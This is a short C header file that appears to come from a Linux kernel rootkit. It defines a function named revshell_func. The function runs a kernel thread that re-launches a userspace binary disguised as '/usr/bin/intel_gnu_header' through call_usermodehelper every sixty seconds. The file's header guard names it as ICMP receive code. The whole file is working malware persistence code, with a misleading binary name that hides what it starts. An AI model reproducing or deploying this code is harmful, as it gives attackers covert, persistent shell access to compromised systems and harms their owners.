#ifndef ICMP_RCV_H
#define ICMP_RCV_H
#include "../config.h"

int revshell_func(void *data) {
    static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
    };
    char *argv[] = {"/usr/bin/intel_gnu_header", NULL};

    while (!kthread_should_stop()) {
        
        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
        ssleep(60); // Sleep for 60 seconds (1 minute)
    }
    return 0;
}



#endif // !ICMP_RCV_H
